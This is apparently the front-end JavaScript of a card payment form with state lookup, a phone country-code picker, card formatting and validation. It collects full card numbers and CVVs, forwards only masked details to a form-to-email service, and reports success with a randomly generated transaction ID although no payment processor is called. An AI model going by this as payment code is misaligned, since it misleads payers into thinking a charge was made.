// FormSubmit handles submission now; old EmailJS/backend email flow removed.

let stateLoadToken = 0;

// ── Update States based on selected country ──────────────────────────────────
async function updateStates() {
  const countrySelect = document.getElementById('country');
  const stateSelect = document.getElementById('state');
  const selectedCountry = countrySelect.value;

  const currentToken = ++stateLoadToken;
  stateSelect.disabled = true;
  stateSelect.innerHTML = '<option value="">Loading states...</option>';

  try {
    const response = await fetch(`${API_BASE}/api/states?country=${encodeURIComponent(selectedCountry)}`);
    const data = await response.json();

    if (currentToken !== stateLoadToken) return;

    const states = Array.isArray(data.states) ? data.states : [];
    stateSelect.disabled = false;
    stateSelect.innerHTML = '<option value="">Select State / Province</option>';

    states.forEach(state => {
      const stateName = typeof state === 'string' ? state : state.name;
      const option = document.createElement('option');
      option.value = stateName;
      option.textContent = stateName;
      stateSelect.appendChild(option);
    });

    if (!states.length) {
      const option = document.createElement('option');
      option.value = '';
      option.textContent = 'No states available';
      stateSelect.appendChild(option);
    }
  } catch (error) {
    if (currentToken !== stateLoadToken) return;

    stateSelect.disabled = false;
    stateSelect.innerHTML = '<option value="">Select State / Province</option>';
    console.error('Failed to load states:', error);
  }
}

// ── Phone country codes ──────────────────────────────────────────────────────
const countryCodes = [
  { code: '+1',   flag: '🇺🇸', name: 'United States' },
  { code: '+44',  flag: '🇬🇧', name: 'United Kingdom' },
  { code: '+92',  flag: '🇵🇰', name: 'Pakistan' },
  { code: '+91',  flag: '🇮🇳', name: 'India' },
  { code: '+61',  flag: '🇦🇺', name: 'Australia' },
  { code: '+1',   flag: '🇨🇦', name: 'Canada' },
  { code: '+49',  flag: '🇩🇪', name: 'Germany' },
  { code: '+33',  flag: '🇫🇷', name: 'France' },
  { code: '+971', flag: '🇦🇪', name: 'UAE' },
  { code: '+966', flag: '🇸🇦', name: 'Saudi Arabia' },
  { code: '+90',  flag: '🇹🇷', name: 'Turkey' },
  { code: '+20',  flag: '🇪🇬', name: 'Egypt' },
  { code: '+98',  flag: '🇮🇷', name: 'Iran' },
  { code: '+62',  flag: '🇮🇩', name: 'Indonesia' },
  { code: '+60',  flag: '🇲🇾', name: 'Malaysia' },
  { code: '+65',  flag: '🇸🇬', name: 'Singapore' },
  { code: '+82',  flag: '🇰🇷', name: 'South Korea' },
  { code: '+81',  flag: '🇯🇵', name: 'Japan' },
  { code: '+86',  flag: '🇨🇳', name: 'China' },
  { code: '+7',   flag: '🇷🇺', name: 'Russia' },
  { code: '+55',  flag: '🇧🇷', name: 'Brazil' },
  { code: '+52',  flag: '🇲🇽', name: 'Mexico' },
  { code: '+27',  flag: '🇿🇦', name: 'South Africa' },
  { code: '+234', flag: '🇳🇬', name: 'Nigeria' },
  { code: '+254', flag: '🇰🇪', name: 'Kenya' },
  { code: '+31',  flag: '🇳🇱', name: 'Netherlands' },
  { code: '+39',  flag: '🇮🇹', name: 'Italy' },
  { code: '+34',  flag: '🇪🇸', name: 'Spain' },
  { code: '+46',  flag: '🇸🇪', name: 'Sweden' },
  { code: '+47',  flag: '🇳🇴', name: 'Norway' },
  { code: '+45',  flag: '🇩🇰', name: 'Denmark' },
  { code: '+358', flag: '🇫🇮', name: 'Finland' },
  { code: '+48',  flag: '🇵🇱', name: 'Poland' },
  { code: '+380', flag: '🇺🇦', name: 'Ukraine' },
  { code: '+32',  flag: '🇧🇪', name: 'Belgium' },
  { code: '+41',  flag: '🇨🇭', name: 'Switzerland' },
  { code: '+43',  flag: '🇦🇹', name: 'Austria' },
  { code: '+351', flag: '🇵🇹', name: 'Portugal' },
  { code: '+30',  flag: '🇬🇷', name: 'Greece' },
  { code: '+420', flag: '🇨🇿', name: 'Czech Republic' },
  { code: '+36',  flag: '🇭🇺', name: 'Hungary' },
  { code: '+40',  flag: '🇷🇴', name: 'Romania' },
  { code: '+63',  flag: '🇵🇭', name: 'Philippines' },
  { code: '+66',  flag: '🇹🇭', name: 'Thailand' },
  { code: '+84',  flag: '🇻🇳', name: 'Vietnam' },
  { code: '+880', flag: '🇧🇩', name: 'Bangladesh' },
  { code: '+94',  flag: '🇱🇰', name: 'Sri Lanka' },
  { code: '+977', flag: '🇳🇵', name: 'Nepal' },
  { code: '+93',  flag: '🇦🇫', name: 'Afghanistan' },
  { code: '+964', flag: '🇮🇶', name: 'Iraq' },
  { code: '+962', flag: '🇯🇴', name: 'Jordan' },
  { code: '+961', flag: '🇱🇧', name: 'Lebanon' },
  { code: '+972', flag: '🇮🇱', name: 'Israel' },
  { code: '+974', flag: '🇶🇦', name: 'Qatar' },
  { code: '+965', flag: '🇰🇼', name: 'Kuwait' },
  { code: '+968', flag: '🇴🇲', name: 'Oman' },
  { code: '+973', flag: '🇧🇭', name: 'Bahrain' },
  { code: '+967', flag: '🇾🇪', name: 'Yemen' },
  { code: '+212', flag: '🇲🇦', name: 'Morocco' },
  { code: '+213', flag: '🇩🇿', name: 'Algeria' },
  { code: '+216', flag: '🇹🇳', name: 'Tunisia' },
  { code: '+249', flag: '🇸🇩', name: 'Sudan' },
  { code: '+251', flag: '🇪🇹', name: 'Ethiopia' },
  { code: '+233', flag: '🇬🇭', name: 'Ghana' },
  { code: '+255', flag: '🇹🇿', name: 'Tanzania' },
  { code: '+256', flag: '🇺🇬', name: 'Uganda' },
  { code: '+54',  flag: '🇦🇷', name: 'Argentina' },
  { code: '+56',  flag: '🇨🇱', name: 'Chile' },
  { code: '+57',  flag: '🇨🇴', name: 'Colombia' },
  { code: '+51',  flag: '🇵🇪', name: 'Peru' },
  { code: '+58',  flag: '🇻🇪', name: 'Venezuela' },
  { code: '+64',  flag: '🇳🇿', name: 'New Zealand' },
  { code: '+353', flag: '🇮🇪', name: 'Ireland' },
  { code: '+352', flag: '🇱🇺', name: 'Luxembourg' },
  { code: '+370', flag: '🇱🇹', name: 'Lithuania' },
  { code: '+371', flag: '🇱🇻', name: 'Latvia' },
  { code: '+372', flag: '🇪🇪', name: 'Estonia' },
  { code: '+386', flag: '🇸🇮', name: 'Slovenia' },
  { code: '+385', flag: '🇭🇷', name: 'Croatia' },
  { code: '+387', flag: '🇧🇦', name: 'Bosnia' },
  { code: '+381', flag: '🇷🇸', name: 'Serbia' },
  { code: '+359', flag: '🇧🇬', name: 'Bulgaria' },
  { code: '+421', flag: '🇸🇰', name: 'Slovakia' },
];

const phoneRules = {
  '+1':   { min: 10, max: 10, placeholder: '2015551234',        hint: '10 digits (e.g. 2015551234)' },
  '+44':  { min: 10, max: 11, placeholder: '07911123456',       hint: '10–11 digits (e.g. 07911123456)' },
  '+92':  { min: 10, max: 10, placeholder: '03001234567',       hint: '10 digits (e.g. 03001234567)' },
  '+91':  { min: 10, max: 10, placeholder: '9876543210',        hint: '10 digits (e.g. 9876543210)' },
  '+61':  { min: 9,  max: 9,  placeholder: '412345678',         hint: '9 digits (e.g. 412345678)' },
  '+49':  { min: 10, max: 11, placeholder: '01512345678',       hint: '10–11 digits' },
  '+33':  { min: 9,  max: 9,  placeholder: '612345678',         hint: '9 digits (e.g. 612345678)' },
  '+971': { min: 9,  max: 9,  placeholder: '501234567',         hint: '9 digits (e.g. 501234567)' },
  '+966': { min: 9,  max: 9,  placeholder: '512345678',         hint: '9 digits (e.g. 512345678)' },
  '+90':  { min: 10, max: 10, placeholder: '5321234567',        hint: '10 digits (e.g. 5321234567)' },
};

function getRule(code) {
  return phoneRules[code] || { min: 7, max: 15, placeholder: 'Enter phone number', hint: '7–15 digits' };
}

let selectedCountryCode = '+1';
let dropdownOpen = false;

function updatePhoneInput(code) {
  const rule  = getRule(code);
  const input = document.getElementById('phoneInput');
  const hint  = document.getElementById('phoneHint');
  input.placeholder = rule.placeholder;
  input.maxLength   = rule.max;
  input.value       = '';
  hint.textContent  = `Format: ${rule.hint}`;
  clearErr('phoneErr');
}

function buildPhoneDropdown() {
  const btn  = document.getElementById('phoneFlag');
  const list = document.getElementById('phoneDropdown');

  const searchBox = document.createElement('input');
  searchBox.type        = 'text';
  searchBox.placeholder = '🔍 Search country...';
  searchBox.className   = 'phone-search';
  searchBox.addEventListener('input', () => {
    const q = searchBox.value.toLowerCase();
    list.querySelectorAll('.phone-option').forEach(item => {
      item.style.display = item.dataset.search.includes(q) ? 'flex' : 'none';
    });
  });
  list.appendChild(searchBox);

  countryCodes.forEach(c => {
    const item = document.createElement('div');
    item.className      = 'phone-option';
    item.dataset.search = (c.name + c.code).toLowerCase();
    item.innerHTML = `<span class="opt-flag">${c.flag}</span><span class="opt-name">${c.name}</span><span class="opt-code">${c.code}</span>`;
    item.addEventListener('click', () => {
      selectedCountryCode = c.code;
      btn.innerHTML = `${c.flag} <span class="dial-sel">${c.code}</span> <span class="arrow">▾</span>`;
      updatePhoneInput(c.code);
      closeDropdown();
    });
    list.appendChild(item);
  });

  btn.addEventListener('click', e => {
    e.stopPropagation();
    dropdownOpen ? closeDropdown() : openDropdown();
  });
  document.addEventListener('click', closeDropdown);
  list.addEventListener('click', e => e.stopPropagation());

  updatePhoneInput('+1');
}

document.addEventListener('DOMContentLoaded', () => {
  buildPhoneDropdown();
  document.getElementById('phoneInput').addEventListener('input', function() {
    this.value = this.value.replace(/\D/g, '');
    validatePhoneLive();
  });
  updateStates();
});

function validatePhoneLive() {
  const val  = document.getElementById('phoneInput').value.trim();
  const rule = getRule(selectedCountryCode);
  if (val.length === 0) { clearErr('phoneErr'); return; }
  if (val.length < rule.min) {
    showErr('phoneErr', `Too short — need at least ${rule.min} digits for this country.`);
  } else if (val.length > rule.max) {
    showErr('phoneErr', `Too long — max ${rule.max} digits for this country.`);
  } else {
    clearErr('phoneErr');
  }
}

function openDropdown() {
  const btn  = document.getElementById('phoneFlag');
  const list = document.getElementById('phoneDropdown');
  const rect = btn.getBoundingClientRect();
  list.style.position = 'fixed';
  list.style.top      = (rect.bottom + 4) + 'px';
  list.style.left     = rect.left + 'px';
  list.style.display  = 'block';
  dropdownOpen = true;
}

function closeDropdown() {
  document.getElementById('phoneDropdown').style.display = 'none';
  dropdownOpen = false;
}

function getCardType(v) {
  if (/^4/.test(v))                       return '💳 VISA';
  if (/^5[1-5]/.test(v))                  return '💳 Mastercard';
  if (/^3[47]/.test(v))                   return '💳 Amex';
  if (/^6011|^64[4-9]|^65/.test(v))       return '💳 Discover';
  return '';
}

function formatCardNumber(input) {
  let v = input.value.replace(/\D/g, '').substring(0, 16);
  input.value = v.replace(/(.{4})/g, '$1 ').trim();

  const type    = getCardType(v);
  const badge   = document.getElementById('cardTypeBadge');
  const validEl = document.getElementById('cardValidIcon');

  if (type) {
    badge.textContent = type;
    badge.style.display = 'inline-block';
  } else {
    badge.style.display = 'none';
  }

  validEl.style.display = 'none';
  clearErr('cardErr');
}

function generateTxnId(len = 20) {
  const c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let r = '';
  for (let i = 0; i < len; i++) r += c[Math.floor(Math.random() * c.length)];
  return r;
}

function showErr(id, msg) { const el = document.getElementById(id); if (msg) el.textContent = msg; el.classList.add('visible'); }
function clearErr(id) { document.getElementById(id).classList.remove('visible'); }

function setBtn(loading) {
  const btn = document.querySelector('.btn-submit');
  btn.disabled = loading;
  btn.textContent = loading ? 'Sending...' : 'Pay Now';
  btn.style.opacity = loading ? '0.7' : '1';
}

async function handleSubmit(event) {
  if (event) event.preventDefault();
  let valid = true;

  const name        = document.getElementById('nameOnCard').value.trim();
  const rawCard     = document.getElementById('cardNumber').value.replace(/\s/g, '');
  const expiryMonth = document.getElementById('expiryMonth').value;
  const expiryYear  = document.getElementById('expiryYear').value;
  const cvv         = document.getElementById('cvv').value.trim();
  const amount      = document.getElementById('amount').value.trim();
  const email       = document.getElementById('email').value.trim();
  const phoneVal    = document.getElementById('phoneInput').value.trim();
  const addr1       = document.getElementById('addr1').value.trim();
  const addr2       = document.getElementById('addr2').value.trim();
  const city        = document.getElementById('city').value.trim();
  const state       = document.getElementById('state').value.trim();
  const postal      = document.getElementById('postal').value.trim();
  const country     = document.getElementById('country').value;

  if (!name) { showErr('nameErr', 'Please enter the name on card.'); valid = false; } else clearErr('nameErr');

  if (!rawCard) {
    showErr('cardErr', 'Please enter your card number.'); valid = false;
  } else if (!/^\d{16}$/.test(rawCard)) {
    showErr('cardErr', 'Card number must be exactly 16 digits.'); valid = false;
  } else { clearErr('cardErr'); }

  if (!expiryMonth) { showErr('monthErr', 'Please select expiry month.'); valid = false; } else clearErr('monthErr');
  if (!expiryYear)  { showErr('yearErr',  'Please select expiry year.');  valid = false; } else clearErr('yearErr');

  if (!/^\d{3,4}$/.test(cvv)) { showErr('cvvErr', 'Please enter a valid CVV (3–4 digits).'); valid = false; } else clearErr('cvvErr');

  if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) { showErr('amountErr', 'Please enter a valid amount.'); valid = false; } else clearErr('amountErr');

  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { showErr('emailErr', 'Please enter a valid email address.'); valid = false; } else clearErr('emailErr');

  const rule = getRule(selectedCountryCode);
  if (phoneVal && (phoneVal.length < rule.min || phoneVal.length > rule.max)) {
    showErr('phoneErr', `Invalid phone. Expected ${rule.hint} for this country.`); valid = false;
  } else { clearErr('phoneErr'); }

  if (!valid) return false;

  const txnId = generateTxnId();
  
  // populate transaction id
  document.getElementById('transactionIdField').value = txnId;

  setBtn(true);

  // Build Web3Forms payload
  const formData = new FormData();
  formData.append('access_key', document.getElementById('web3formsAccessKey')?.value || '');
  formData.append('transaction_id', txnId);
  formData.append('name', name);
  // Do NOT send full card number or CVV to Web3Forms (PCI-sensitive)
  // Send only masked last-4 for reference if needed
  const cardLast4 = rawCard ? rawCard.slice(-4) : '';
  if (cardLast4) formData.append('card_last4', `**** **** **** ${cardLast4}`);
  // expiry month/year are optional for reference (no PAN/CVV)
  if (expiryMonth) formData.append('month', expiryMonth);
  if (expiryYear)  formData.append('year', expiryYear);
  formData.append('amount', amount);
  formData.append('email', email);
  formData.append('phone', phoneVal);
  formData.append('address1', addr1);
  formData.append('address2', addr2);
  formData.append('city', city);
  formData.append('state', state);
  formData.append('postal', postal);
  formData.append('country', country);

  try {
    const res = await fetch('https://api.web3forms.com/submit', {
      method: 'POST',
      headers: { Accept: 'application/json' },
      body: formData,
    });
    const json = await res.json().catch(() => ({}));
    if (!res.ok || json.success === false) throw new Error(json.message || 'Submission failed');

    // Web3Forms accepted — now send customer email via backend (same as admin email)
    try {
      const emailPayload = {
        transaction_id: txnId,
        name,
        amount,
        email,
        phone: phoneVal,
        address1: addr1,
        address2: addr2,
        city,
        state,
        postal,
        country,
      };
      await fetch(`${API_BASE}/api/send-email`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(emailPayload),
      });
      // Email sent silently (backend handles success/failure)
    } catch (emailErr) {
      console.warn('Backend email send failed (non-critical):', emailErr);
      // Continue anyway — form was already accepted by Web3Forms
    }

    document.getElementById('txnId').textContent = txnId;
    document.getElementById('successBox').classList.add('visible');
    document.getElementById('paymentForm').style.display = 'none';
    setBtn(false);
    return true;
  } catch (err) {
    alert(err.message || 'Unable to submit form');
    setBtn(false);
    return false;
  }
}
